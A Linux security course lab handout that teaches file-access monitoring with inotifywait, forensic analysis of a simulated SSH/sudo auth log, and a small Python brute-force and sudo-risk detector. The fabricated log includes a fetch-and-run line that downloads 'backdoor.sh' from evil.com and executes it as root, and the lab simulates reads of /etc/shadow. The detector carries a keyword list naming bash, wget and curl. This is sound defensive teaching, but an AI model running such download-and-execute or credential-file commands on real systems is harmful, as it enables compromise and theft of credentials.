---
title: "Lab 11 — System Audit Logging: inotifywait & Auth Log Analysis"
course: SCIA-360
topic: Linux Security Architecture & Incident Detection
chapter: "11 / 14"
difficulty: "⭐⭐"
estimated_time: "60–75 minutes"
tags:
  - logging
  - inotify
  - forensics
  - incident-response
  - auth-log
  - threat-detection
---

# Lab 11 — System Audit Logging: inotifywait & Auth Log Analysis

| Field | Details |
|-------|---------|
| **Course** | SCIA-360 OS Security |
| **Topic** | Linux Security Architecture & Incident Detection |
| **Chapters** | 11 (Logging) and 14 (Security Monitoring) |
| **Difficulty** | ⭐⭐ Intermediate |
| **Estimated Time** | 60–75 minutes |
| **Requires** | Docker, `ubuntu:22.04` image, Python 3 |

---

## Overview

Security logging is the **foundation of incident detection and forensics**. Without logs, you cannot determine when a breach occurred, what the attacker did, or how to prevent recurrence. Two critical skill areas for security professionals are:

1. **Real-time file monitoring** — detecting suspicious filesystem activity as it happens using `inotifywait`
2. **Log forensics** — reconstructing an incident timeline from authentication logs (`/var/log/auth.log`)

In this lab you will monitor filesystem access in real time, recognize reconnaissance patterns from inotify output, analyze a realistic authentication log to reconstruct a multi-stage compromise, and build a Python-based automated threat detection script.

**Key tools:**

| Tool | Purpose |
|------|---------|
| `inotifywait` | Real-time inotify-based filesystem event monitoring |
| `grep` / `awk` | Log pattern extraction |
| `uniq -c` / `sort` | Frequency analysis for brute-force detection |
| Python 3 `re` | Automated log parsing and alerting |

---

## Part 1 — Real-Time File Monitoring

`inotifywait` uses the Linux **inotify** kernel subsystem to receive events whenever files or directories are accessed, modified, created, deleted, or have their attributes changed. Unlike polling-based approaches, inotify is event-driven and has negligible performance overhead.

### Step 1.1 — Launch the lab container and install tools

```bash
docker run --rm -it ubuntu:22.04 bash
```

Once inside the container:

```bash
apt-get update -qq && apt-get install -y -qq inotify-tools 2>/dev/null
```

---

### Step 1.2 — Start monitoring sensitive directories

Launch `inotifywait` in the background, monitoring `/etc` and `/root` for the events most relevant to attacker activity:

```bash
inotifywait -m /etc /root -e access,modify,create,delete,attrib \
  --format '%T %e %w%f' --timefmt '%H:%M:%S' 2>/dev/null &
MON=$!
sleep 0.5
```

**Flag breakdown:**

| Flag | Meaning |
|------|---------|
| `-m` | Monitor continuously (don't exit after first event) |
| `-e access,modify,create,delete,attrib` | Event types to watch |
| `--format '%T %e %w%f'` | Output: timestamp, event, full path |
| `--timefmt '%H:%M:%S'` | Human-readable time format |

---

### Step 1.3 — Trigger events (simulated attacker recon)

These commands simulate the actions an attacker would take immediately after gaining initial access — reading credential files, modifying network configuration, and planting a backdoor:

```bash
cat /etc/passwd > /dev/null
cat /etc/shadow > /dev/null
echo 'new_entry' >> /etc/hosts
touch /root/suspicious_backdoor.sh
sleep 1
kill $MON 2>/dev/null
```

**Expected output from inotifywait:**
```
10:15:23 ACCESS /etc/passwd
10:15:23 ACCESS /etc/shadow
10:15:23 MODIFY /etc/hosts
10:15:23 CREATE /root/suspicious_backdoor.sh
```

Each line shows the precise timestamp, event type, and affected file. This is what a real-time HIDS (Host Intrusion Detection System) would log and potentially alert on.

📸 **Screenshot checkpoint 11a:** Capture the `inotifywait` output showing all four events with their timestamps and event types.

---

## Part 2 — Detecting Reconnaissance Patterns

A single file access might be normal. **Rapid sequential access to multiple sensitive files within seconds** is a strong indicator of automated post-compromise reconnaissance — typically a script that the attacker dropped and executed.

### Step 2.1 — Rapid sequential access to sensitive files

```bash
inotifywait -m /etc -e access --format '%T ACCESSED: %f' --timefmt '%H:%M:%S' 2>/dev/null &
MON=$!
sleep 0.5

for f in passwd shadow group sudoers crontab; do
  cat /etc/$f > /dev/null 2>&1
done

sleep 1
kill $MON 2>/dev/null
```

**Expected output:**
```
10:16:44 ACCESSED: passwd
10:16:44 ACCESSED: shadow
10:16:44 ACCESSED: group
10:16:44 ACCESSED: sudoers
10:16:44 ACCESSED: crontab
```

Five sensitive files accessed within the **same second** — this is the signature of an automated reconnaissance script, not a human user. A HIDS rule triggering on "5+ sensitive file reads within 2 seconds" would catch this immediately.

!!! warning "Why this matters"
    The files targeted — `passwd`, `shadow`, `group`, `sudoers`, `crontab` — together give an attacker a complete picture of: all system users, hashed passwords, group memberships, who has sudo, and scheduled tasks they can hijack. This is the attacker building a map before their next move.

📸 **Screenshot checkpoint 11b:** Capture the rapid sequential access output showing all five sensitive files accessed within the same timestamp.

---

## Part 3 — Auth Log Forensics

Authentication logs (`/var/log/auth.log` on Debian/Ubuntu systems) record SSH logins, sudo commands, su usage, and PAM authentication events. Skilled analysts can reconstruct entire attack timelines from these logs.

### Step 3.1 — Create a realistic authentication log

This log captures a real-world scenario: an SSH brute-force attack followed by a legitimate user login, suspicious sudo activity, and eventual account compromise and backdoor installation.

```bash
cat > /tmp/auth.log << 'AUTHEOF'
Apr 18 10:00:01 webserver sshd[1234]: Failed password for invalid user admin from 185.220.101.45 port 43210 ssh2
Apr 18 10:00:02 webserver sshd[1234]: Failed password for invalid user root from 185.220.101.45 port 43211 ssh2
Apr 18 10:00:03 webserver sshd[1234]: Failed password for invalid user oracle from 185.220.101.45 port 43212 ssh2
Apr 18 10:00:04 webserver sshd[1234]: Failed password for invalid user postgres from 185.220.101.45 port 43213 ssh2
Apr 18 10:00:05 webserver sshd[1234]: Failed password for invalid user ubuntu from 185.220.101.45 port 43214 ssh2
Apr 18 10:00:06 webserver sshd[1234]: Failed password for invalid user pi from 185.220.101.45 port 43215 ssh2
Apr 18 10:05:00 webserver sshd[2000]: Accepted publickey for alice from 10.0.0.5 port 55123 ssh2
Apr 18 10:05:01 webserver sudo[2100]: alice : TTY=pts/0 ; PWD=/home/alice ; USER=root ; COMMAND=/bin/cat /etc/shadow
Apr 18 10:30:00 webserver sshd[3000]: Failed password for bob from 198.51.100.99 port 12345 ssh2
Apr 18 10:30:01 webserver sshd[3001]: Failed password for bob from 198.51.100.99 port 12346 ssh2
Apr 18 10:30:02 webserver sshd[3002]: Failed password for bob from 198.51.100.99 port 12347 ssh2
Apr 18 11:00:00 webserver sudo[4000]: alice : TTY=pts/0 ; PWD=/root ; USER=root ; COMMAND=/bin/bash
Apr 18 11:00:05 webserver sshd[5000]: Disconnected from user alice 10.0.0.5 port 55123
Apr 18 11:15:00 webserver sshd[6000]: Accepted password for alice from 203.0.113.200 port 44444 ssh2
Apr 18 11:15:30 webserver sudo[6100]: alice : TTY=pts/1 ; PWD=/home/alice ; USER=root ; COMMAND=/usr/bin/wget http://evil.com/backdoor.sh
Apr 18 11:15:35 webserver sudo[6200]: alice : TTY=pts/1 ; PWD=/home/alice ; USER=root ; COMMAND=/bin/bash backdoor.sh
AUTHEOF
```

---

### Step 3.2 — Analyze the log

Run each analysis block separately and examine the output carefully:

```bash
echo '=== Failed logins by IP ==='
grep 'Failed password' /tmp/auth.log | grep -oP 'from \K[0-9.]+' | sort | uniq -c | sort -rn

echo ''
echo '=== Targeted usernames ==='
grep 'Failed password' /tmp/auth.log | grep -oP 'for (invalid user )?\K\w+' | sort | uniq -c | sort -rn

echo ''
echo '=== Successful logins ==='
grep 'Accepted' /tmp/auth.log

echo ''
echo '=== Sudo commands (high risk) ==='
grep 'COMMAND=' /tmp/auth.log
```

**Expected output:**
```
=== Failed logins by IP ===
      6 185.220.101.45     ← brute-force source
      3 198.51.100.99      ← secondary attacker targeting bob

=== Targeted usernames ===
      1 admin
      1 root
      1 oracle
      1 postgres
      1 ubuntu
      1 pi
      1 bob

=== Successful logins ===
Apr 18 10:05:00 ... Accepted publickey for alice from 10.0.0.5
Apr 18 11:15:00 ... Accepted password for alice from 203.0.113.200  ← different IP!

=== Sudo commands (high risk) ===
... alice ... COMMAND=/bin/cat /etc/shadow     ← credential theft
... alice ... COMMAND=/bin/bash                ← root shell
... alice ... COMMAND=/usr/bin/wget http://evil.com/backdoor.sh
... alice ... COMMAND=/bin/bash backdoor.sh    ← backdoor execution
```

📸 **Screenshot checkpoint 11c:** Capture the "Failed logins by IP" and "Targeted usernames" sections.

📸 **Screenshot checkpoint 11d:** Capture the "Sudo commands" section showing alice's high-risk commands.

---

### Step 3.3 — Reconstruct the incident timeline

```bash
echo '=== INCIDENT TIMELINE ==='
echo '10:00 - Brute force from 185.220.101.45 (6 attempts, common service accounts)'
echo '10:05 - Alice logs in legitimately from 10.0.0.5 (internal IP, key-based)'
echo '10:05 - Alice runs: sudo cat /etc/shadow   <-- SUSPICIOUS (credential theft attempt)'
echo '11:00 - Alice runs: sudo bash              <-- SUSPICIOUS (dropped to root shell)'
echo '11:00 - Alice disconnects'
echo '11:15 - alice logs in from 203.0.113.200  <-- DIFFERENT IP (account likely compromised)'
echo '11:15 - Downloads and executes backdoor.sh as root  <-- CONFIRMED COMPROMISE'
grep 'alice' /tmp/auth.log
```

📸 **Screenshot checkpoint 11e:** Capture the full incident timeline output and the alice-filtered log entries.

---

## Part 4 — Automated Threat Detection

Manual log analysis works for incident response, but production systems generate millions of log lines per day. Automated parsing and alerting is essential. The script below demonstrates key detection logic: brute-force threshold alerting and sudo command risk scoring.

### Step 4.1 — Python threat detection script

```bash
python3 << 'EOF'
import re
from collections import defaultdict

failed = defaultdict(int)
sudo_cmds = []

with open('/tmp/auth.log') as f:
    for line in f:
        m = re.search(r'Failed password.*from (\S+)', line)
        if m: failed[m.group(1)] += 1
        if 'COMMAND=' in line:
            cmd = line.split('COMMAND=')[-1].strip()
            user = re.search(r'sudo\[\d+\]: (\w+)', line)
            sudo_cmds.append((user.group(1) if user else '?', cmd))

print('=== Brute Force Detection ===')
for ip, count in sorted(failed.items(), key=lambda x: -x[1]):
    flag = ' ⚠️  ALERT: possible brute force' if count >= 3 else ''
    print(f'  {ip}: {count} failures{flag}')

print('\n=== Sudo Command Risk Audit ===')
danger_words = ['bash', 'sh', 'wget', 'curl', 'chmod', 'python', 'perl']
for user, cmd in sudo_cmds:
    risk = any(w in cmd for w in danger_words)
    flag = ' ⚠️  HIGH RISK' if risk else ''
    print(f'  {user}: {cmd[:60]}{flag}')
EOF
```

**Expected output:**
```
=== Brute Force Detection ===
  185.220.101.45: 6 failures ⚠️  ALERT: possible brute force
  198.51.100.99: 3 failures ⚠️  ALERT: possible brute force

=== Sudo Command Risk Audit ===
  alice: /bin/cat /etc/shadow
  alice: /bin/bash ⚠️  HIGH RISK
  alice: /usr/bin/wget http://evil.com/backdoor.sh ⚠️  HIGH RISK
  alice: /bin/bash backdoor.sh ⚠️  HIGH RISK
```

The script correctly flags both brute-force sources and identifies alice's three high-risk sudo commands. In a production SIEM, these detections would trigger automated alerts to the security team.

📸 **Screenshot checkpoint 11f:** Capture the complete Python script output showing both detection sections with their alert flags.

---

## Cleanup

Exit the container (type `exit` or press `Ctrl+D`), then:

```bash
docker system prune -f
```

---

## Assessment

### Screenshot Checklist

| ID | Description | Points |
|----|-------------|--------|
| **11a** | `inotifywait` showing real-time file events with timestamps and event types | 7 |
| **11b** | Reconnaissance pattern — five sensitive files accessed in the same second | 7 |
| **11c** | Failed logins by IP frequency analysis | 6 |
| **11d** | Sudo command audit output showing alice's commands | 6 |
| **11e** | Incident timeline reconstruction with alice's filtered log entries | 7 |
| **11f** | Automated threat detection script output with alert flags | 7 |
| | **Screenshot subtotal** | **40** |

!!! tip "Grading Rubric"
    | Component | Points |
    |-----------|--------|
    | Screenshots (checklist above) | 40 |
    | Incident timeline narrative (written reconstruction — see below) | 20 |
    | Reflection questions (4 × 10 pts each) | 40 |
    | **Total** | **100** |

---

### Incident Timeline Narrative *(complete and submit)*

Write a **300–400 word incident narrative** in the style of a professional incident report covering the events in `auth.log`. Your narrative must address:

- Who are the threat actors? (differentiate the brute-force attacker from the alice account activity)
- What is the attack sequence in chronological order?
- At what exact point does legitimate activity become malicious activity?
- What was the attacker's ultimate goal (based on the evidence)?
- What were the first three containment actions you would take if this were your production server?

---

### Reflection Questions

Answer each question in **150–200 words**.

1. **Post-compromise reconnaissance:** `inotifywait` detected rapid sequential reads of `/etc/passwd`, `/etc/shadow`, `/etc/group`, and `/etc/sudoers`. What specific information is the attacker collecting from each file? What does this tell you about which phase of the attack kill chain (Cyber Kill Chain or MITRE ATT&CK) you are observing? What is the attacker likely planning to do next?

2. **Brute-force characteristics:** The brute-force attack from `185.220.101.45` targeted usernames like `admin`, `oracle`, `postgres`, `ubuntu`, and `pi`. What does the **choice of username** tell you about the attack type — is this targeted reconnaissance against your specific organization, or is it automated/opportunistic scanning? What does the source IP `185.220.101.45` (a known Tor exit node range) suggest about attribution?

3. **Account compromise scenario:** Alice logged in from `10.0.0.5` (internal IP, using an SSH key), then later reconnected from `203.0.113.200` (external IP, using a password). Between these sessions she ran `sudo bash` and disconnected. Construct the most plausible attack scenario that explains this sequence of events. What may have happened to Alice's account between 11:00 and 11:15?

4. **SIEM and log integrity:** Why is forwarding logs to a separate, hardened log server (SIEM — Security Information and Event Management) **critical** for incident response? What is typically the **first action** an attacker takes after gaining root access to cover their tracks on a compromised Linux system? How does centralized log forwarding defeat this technique?
